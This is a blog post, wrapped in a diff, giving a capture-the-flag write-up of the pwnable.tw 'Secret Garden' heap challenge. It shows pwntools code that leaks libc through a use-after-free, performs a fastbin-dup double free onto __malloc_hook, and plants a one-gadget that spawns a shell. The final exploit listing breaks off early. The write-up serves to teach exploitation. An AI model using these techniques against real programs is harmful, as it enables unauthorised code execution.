@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Pwnable.tw: Secret Garden | Intranautic</title>
+<meta property="og:title" content="Pwnable.tw: Secret Garden | Intranautic" />
+<meta name="twitter:title" content="Pwnable.tw: Secret Garden | Intranautic" />
+<meta itemprop="name" content="Pwnable.tw: Secret Garden | Intranautic" />
+<meta name="application-name" content="Pwnable.tw: Secret Garden | Intranautic" />
+<meta property="og:site_name" content="The Information Machine" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="https://intranautic.com/" />
+  <meta property="og:image" content="https://intranautic.com/" />
+  <meta name="twitter:image" content="https://intranautic.com/" />
+  <meta name="twitter:image:src" content="https://intranautic.com/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-01-03T00:00:00Z />
+    <meta property="article:published_time" content=2023-01-03T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Pwnable.tw: Secret Garden",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-01-03",
+        "description": "",
+        "wordCount":  1927 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-01-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Intranautic"
+        }
+    }
+    </script>
+
+  <meta name="generator" content="Hugo 0.111.3">
+
+  
+
+  <link rel="canonical" href="https://intranautic.com/posts/pwnabletw-secretgarden/"><link href="/sass/main.min.36e7ee4e3046bff5f058154410a73a98578dd678c08cd8c5c0b28bedca593f36.css" rel="stylesheet"><link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+  
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#2b5797">
+  <meta name="msapplication-config" content="/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <link rel="icon" type="image/svg+xml" href="/images/favicon/favicon.svg">
+
+  
+    </head><body data-theme = "dark" class="notransition">
+<script src="https://intranautic.com/js/themeLoader.min.4e9e1a253d543bbfec02e7f2460d9621e719fd739dc8a5256faa91cda6e12e03.js"></script><div class="navbar" role="navigation">
+  <nav class="menu" aria-label="Main Navigation">
+    <a href="/" class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+    </a>
+    <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+    <label for="menu-trigger">
+      <span class="menu-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+      </span>
+    </label>
+
+    <div class="trigger">
+      <ul class="trigger-container">
+        
+        
+          <li>
+            <a 
+            class="menu-link "
+            href="/">
+            Home
+            </a>
+            
+          </li>
+        
+          <li>
+            <a 
+            class="menu-link active"
+            href="/posts/">
+            Posts
+            </a>
+            
+          </li>
+        
+          <li>
+            <a 
+            class="menu-link "
+            href="/about/">
+            About
+            </a>
+            
+          </li>
+        
+        <li class="menu-separator">
+          <span>|</span>
+        </li>
+      </ul>
+      <a id="mode" href="#">
+        <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+      </a>
+    </div>
+  </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Pwnable.tw: Secret Garden</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-01-03T00:00:00&#43;00:00" itemprop="datePublished"> Jan 3, 2023 </time>
+                </div>
+            </header>
+            <div class="page-content">
+                <blockquote>
+<p>Secret Garden [350 pts]</p>
+<p>Find the flag in the garden.</p>
+<p>nc chall.pwnable.tw 10203</p>
+<p><a href="https://pwnable.tw/static/chall/secretgarden">secretgarden</a>
+<a href="https://pwnable.tw/static/libc/libc_64.so.6">libc.so</a>
+<a href="/assets/files/secretgarden.bndb">secretgarden.bndb</a></p>
+</blockquote>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>When initially executing the binary, we can see that we are prompted with the following
+menu.</p>
+<pre tabindex="0"><code>☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
+☆          Secret Garden          ☆
+☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆
+
+  1 . Raise a flower
+  2 . Visit the garden
+  3 . Remove a flower from the garden
+  4 . Clean the garden
+  5 . Leave the garden
+
+Your choice :
+</code></pre><p>We are given a menu, as well as a few options which provide us with a fair amount of control
+over the process heap. Lets open this up and analyze the internals of this binary, if you are
+using binary ninja a bndb has been provided in the footnote at the start of the post.</p>
+<p><img src="/assets/img/secretgarden-main.png" alt="main"></p>
+<p>On initial analysis we can see that this appears to be a simple heap note challenge. Its a
+simple loop which reads our input and acts accordingly. With further analysis, I&rsquo;ve rebuilt
+the flower structure which is defined as the following.</p>
+<p><img src="/assets/img/secretgarden-struct_flower.png" alt="flower_struct"></p>
+<p>The is_alive flag serves to indicate whether or not the flower has been removed from the
+garden or not. When removing flowers, the actual flower structure is not actually deallocated
+from memory as we will see later.</p>
+<p>Let&rsquo;s take a look at each of the options, starting with raise_flower.</p>
+<p><img src="/assets/img/secretgarden-raise_flower.png" alt="raise_flower"></p>
+<p>We can see that the raise_flower option allows us to initialize a flower and store it within
+a global array of flower pointers denoted by the symbol g_garden. There is also a limit to
+how many flowers we can raise, in this case it allows us 100 flowers which is more than
+enough.</p>
+<p><img src="/assets/img/secretgarden-visit_garden.png" alt="visit_garden"></p>
+<p>Next we have the visit garden function, this allows us to view the name and color fields of the
+flowers within the garden. It will traverse through the global array of flower pointers and
+will print the fields if and only if the is_alive flag is set.</p>
+<p><img src="/assets/img/secretgarden-remove_flower.png" alt="remove_flower"></p>
+<p>Then the remove flower option, it prompts us to enter the index of the flower we want to
+remove from the garden. It will then set the is_alive flag to zero to indicate that the
+flower is no longer alive, and will then free the name field of the flower.</p>
+<p><img src="/assets/img/secretgarden-clean_garden.png" alt="clean_garden"></p>
+<p>Lastly, the clean garden function will free the actual flower structures, as opposed to
+the remove_flower option. However, we can only clear all the flowers in the garden in
+bulk.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>This binary has a few vulnerabilties which we can leverage, the first of which is a use
+after free in the remove_flower option. When the name field of the flower is freed, the
+pointer is not zeroed out. This allows us to free the chunk any arbitrary amount of times
+and leverage double free.</p>
+<p>The next vulnerability is another use after free, very similar to the previous one except
+this time we can read from a freed chunk. This allows us to leak the metadata on the heap
+and leak important structures within memory.</p>
+<p>The challenge is running with glibc version 2.23, which means that there is no tcache. This
+means we can easily gain an arbitrary write vulnerability by abusing the double free and the
+fast bin.</p>
+<p>What follows is a high level overview of the steps which are taken to gain arbitrary code
+execution on the binary.</p>
+<ol>
+<li>Leak the fd/bk pointer of an unsorted bin chunk with our uaf read.</li>
+<li>Perform fastbin dup attack to gain arbitrary write on malloc_hook.</li>
+<li>Overwrite the malloc hook with a one gadget within libc.</li>
+<li>Trigger an error within the allocator to call malloc_printerr, which calls malloc_hook and
+gives us a shell.</li>
+</ol>
+<p>First and foremost, we can leverage the use after free read to leak the metadata of a chunk.
+We can leak either the fd or bk pointers of a chunk within the unsorted bin free list and
+calculate the base address of libc. However, we cannot simply remove a flower and read its
+contents, as there is the is_alive flag which prevents us from doing so.</p>
+<p>The following is a high level snippet of the code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">g_garden</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">result</span><span class="o">-&gt;</span><span class="n">is_alive</span><span class="p">.</span><span class="n">d</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name of the flower[%u] :%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">result</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Color of the flower[%u] :%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">g_garden</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">color</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="mh">0x64</span><span class="p">)</span>
+</span></span></code></pre></div><p>Thanks to the level of control we have over the heap, we can groom the heap into returning
+a chunk from the unsorted bin. Keep in mind, the fact that, when we raise a flower, it
+performs two allocations. It will allocate the structure first, then the name field. This
+is important, as cached chunks within the unsorted bin will split to service either a smaller
+or perfect fit allocation request.</p>
+<p>We can achieve this by freeing two large chunks and place them into the unsorted bin. From
+here we can raise a new flower. The first allocation which is of size 0x28 bytes will split
+the first chunk from the unsorted bin, our next allocation of the name field will return us
+the chunk directly from the unsorted bin.</p>
+<p>The following is the snippet of the exploit which allows us to leak the metadata on the heap
+and calculate the addresses of various important structures and regions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># leak unsorted bin pointers</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x410 outside of tcache bin field, im debugging on glibc 2.31</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arena_base</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">visit_garden</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">][</span><span class="o">-</span><span class="mi">6</span><span class="p">:],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span><span class="o">-</span><span class="mi">1096</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">arena_base</span> <span class="o">-</span> <span class="mh">0x3c3b20</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3c3b10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Arena base address: </span><span class="si">%#lx</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">arena_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Libc base address: </span><span class="si">%#lx</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Malloc hook address: </span><span class="si">%#lx</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">malloc_hook</span><span class="p">)</span>
+</span></span></code></pre></div><p>Next, we need to gain an arbitrary write. We can do so by performing a fastbin dup attack,
+which is essentially a double free which leverages the fast bin to gain an arbitrary write.
+This should be a fairly simple exploit, but there is an obstacle in the way which we need
+to overcome. We will cover this in detail at a later point in this post when the issue
+arises.</p>
+<p>As this fast bin dup technique is already very widely known and documented, I won&rsquo;t be covering
+it here. Just a general overview of the process in regards to this specific binary.</p>
+<p>What follows is a code snippet which performs the double free and attempts to gain an arbitrary
+write primitive.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># fastbin dup</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>At this point, the state of the fast bin will look like the following.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">fastbins</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x70</span><span class="p">:</span> <span class="mh">0x555556a63490</span> <span class="err">—▸</span> <span class="mh">0x555556a63980</span> <span class="err">◂—</span> <span class="mh">0x555556a63490</span>
+</span></span></code></pre></div><p>As we can see, there is a duplicate chunk within the fast bin. Due to the fact that the
+purpose of the fast bin is, as the name implies, fast. It will only perform minimal logic
+when operating on the free list and this means it will only check if the top chunk and
+the chunk it is inserting into the free list is equal. This only prevents consecutive
+double frees, but does not prevent us from simply freeing another chunk in between to
+bypass this check.</p>
+<p>Our next hurdle has to do with the following line of code from glibc 2.23.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="nf">fastbin_index</span> <span class="p">(</span><span class="nf">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">errstr</span> <span class="o">=</span> <span class="s">&#34;malloc(): memory corruption (fast)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nl">errout</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="n">errstr</span><span class="p">,</span> <span class="nf">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">),</span> <span class="n">av</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>We can see that before it removes an entry from the fast bin to service an allocation request,
+it will first check whether or not the chunk falls within the size of the fast bin as to prevent
+memory corruption. If the index of the chunk is not the correct fast bin index, it will throw
+the following error and terminate the process, &ldquo;malloc(): memory corruption (fast)&rdquo;.</p>
+<p>To bypass this check, we have to fake a fast bin chunk either by crafting one in memory, or
+using the surrounding metadata. In this case, we can utilize the metadata surrounding the
+address we want to write to. In this case, the allocator does not check if the address
+is aligned, so lets look around the region of memory before the malloc_hook we want to control
+to see if we have any bytes which may serve as a fake chunk size.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f6ad06d7ae0</span> <span class="err">&lt;</span><span class="no">_IO_wide_data_0</span><span class="err">+</span><span class="mi">288</span><span class="err">&gt;</span><span class="p">:</span>   <span class="mi">0x0000000000000000</span>      <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f6ad06d7af0</span> <span class="err">&lt;</span><span class="no">_IO_wide_data_0</span><span class="err">+</span><span class="mi">304</span><span class="err">&gt;</span><span class="p">:</span>   <span class="mi">0x00007f6ad06d6260</span>      <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f6ad06d7b00</span> <span class="err">&lt;</span><span class="no">__memalign_hook</span><span class="err">&gt;</span><span class="p">:</span>       <span class="mi">0x00007f6ad03b5b00</span>      <span class="mi">0x00007f6ad03b5aa0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f6ad06d7b10</span> <span class="err">&lt;</span><span class="no">__malloc_hook</span><span class="err">&gt;</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>      <span class="mi">0x0000000000000000</span>
+</span></span></code></pre></div><p>We can see that the malloc hook is surrounded by various other structures. Something we need
+to keep in mind is the fact that malloc will return the usable region of a chunk, meaning
+that we have to account for this when using various metadata to forge a fast bin chunk.</p>
+<p>Keeping all these factors in mind, we can shift the address we want to pass as our forged chunk
+by any offset we like. First things first, lets choose an appropriate size for the fastbin. The
+offset I chose was an offset of -0x23, here is how the chunk will be percieved by the allocator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">x</span><span class="err">/</span><span class="mi">8</span><span class="no">gx</span> <span class="mi">0x7f0effa4eb10</span><span class="p">-</span><span class="mi">35</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f0effa4eaed</span> <span class="err">&lt;</span><span class="no">_IO_wide_data_0</span><span class="err">+</span><span class="mi">301</span><span class="err">&gt;</span><span class="p">:</span>   <span class="mi">0x0effa4d260000000</span>      <span class="mi">0x000000000000007f</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x7f0effa4eafd:</span> <span class="err">0</span><span class="nf">x0eff72cb00000000</span>      <span class="mi">0x0eff72caa000007f</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x7f0effa4eb0d</span> <span class="err">&lt;</span><span class="no">__realloc_hook</span><span class="err">+</span><span class="mi">5</span><span class="err">&gt;</span><span class="p">:</span>      <span class="mi">0x000000000000007f</span>      <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x7f0effa4eb1d:</span> <span class="err">0</span><span class="nf">x0100000000000000</span>      <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="p">*(</span><span class="no">struct</span> <span class="no">malloc_chunk</span> <span class="p">*)(</span><span class="mi">0x7f0effa4eb10</span><span class="p">-</span><span class="mi">35</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$2</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">prev_size</span> <span class="err">=</span> <span class="mi">1080763659052908544</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">size</span> <span class="err">=</span> <span class="mi">127</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fd</span> <span class="err">=</span> <span class="mi">0xeff72cb00000000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">bk</span> <span class="err">=</span> <span class="mi">0xeff72caa000007f</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fd_nextsize</span> <span class="err">=</span> <span class="mi">0x7f</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">bk_nextsize</span> <span class="err">=</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span></code></pre></div><p>With this, the allocator will return us the usable region of the chunk which is 0x10 bytes after
+the real address of the chunk. Therefore the offset we need to overwrite malloc_hook is 0x13.</p>
+<p>Alright, now all we need is a reliable one gadget and a means to trigger the hook. What follows
+is the output of all the one gadgets within the libc provided to us.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x45216</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x30</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rax</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x4526a</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x30</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x30</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xef6c4</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x50</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x50</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xf0567</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x70</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x70</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span></code></pre></div><p>I find that the gadget located at the offset 0xef6c4 worked for me. We can now overwrite
+the hook with the address of the one gadget within libc at runtime, and trigger the hook
+by calling the function malloc_printerr. This function is used to, as the name suggests,
+print an error for the glibc memory allocator. We can trigger this by any means, but i
+chose to perform another double free to trigger an error.</p>
+<p>The following is the complete code for the exploit, thanks for reading.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;secretgarden&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib_path</span> <span class="o">=</span> <span class="s2">&#34;/glibc/2.23/64/lib&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc_64.so.6&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-r&#39;</span><span class="p">:</span>
